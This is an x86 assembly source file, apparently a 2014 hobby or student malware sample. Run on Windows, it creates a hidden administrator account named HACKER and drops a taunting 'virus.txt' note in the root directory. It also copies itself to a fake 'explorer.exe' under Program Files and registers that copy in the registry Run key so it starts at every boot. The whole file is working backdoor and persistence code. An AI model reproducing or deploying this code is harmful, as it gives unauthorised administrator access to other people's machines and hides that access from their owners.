; Description:	 Creates a username HACKER with the password HACKER on the local
;				 machine and adds it to the administrator group.
; Author:		 Perabjoth Singh Bajwa
; Revision date: 12/3/2014

.386
.model flat, stdcall
option casemap : None
include windows.inc
include msvcrt.inc
includelib msvcrt.lib
includelib kernel32.lib
include kernel32.inc
include winextra.inc

system PROTO C, : DWORD
GetModuleFileNameA PROTO : dword, : dword, : dword

.data
filename BYTE "\virus.txt",0;name of file to be created under the root directory (C:\)
filehandle DWORD 0;handle of the previous file
message BYTE "Fear me. For I am the almighty who has hacked your machine.",0;message that is placed inside the text file in the root directory
path BYTE 512 DUP(?);path of the current process will be stored in this
rename BYTE "C:\Program Files\explorer.exe",0;target where the exe file will be copied to. NOT IN SYSTEM32 FOLDER SINCE IT WASN'T BEING CREATED THERE
write DWORD 0;write constant set to 0
netuser BYTE "net user HACKER HACKER /add >NUL 2>&1",0;command for creating user called HACKER and piping command to null
random DWORD ?;random dword needed in order to successfully write into text file that was created so that program doesn't crash
netadmin BYTE "net localgroup administrators HACKER /add >NUL 2>&1",0;command to add the user that was created to that administrators
regdata BYTE 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v null /d "C:\Program Files\explorer.exe" >NUL 2>&1', 0;adding the copied instance of the program to the registry
.code
main PROC
	push	NULL
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_NEW
	push	NULL
	push	FILE_SHARE_READ
	push	GENERIC_WRITE
	push	OFFSET filename
	call	CreateFile ;creates desired file after pushing appropriate values
	mov		filehandle,eax
	push	NULL
	push	OFFSET random
	push	SIZEOF message
	push	OFFSET message
	push	filehandle
	call	WriteFile ;writes desired message into file after pushing appropriate values
	push	OFFSET netuser
	call	system;creates the user
	push	OFFSET netadmin
	call	system;sets the user to be an admin
	INVOKE	GetModuleFileName,0,ADDR path,261;gets the path of the current running instance of the process
	push	FALSE
	push	OFFSET rename
	push	OFFSET path
	call	CopyFile;copying this exe to desired path
	push	OFFSET regdata
	call	system
	push 0
	call	ExitProcess
main ENDP
END main
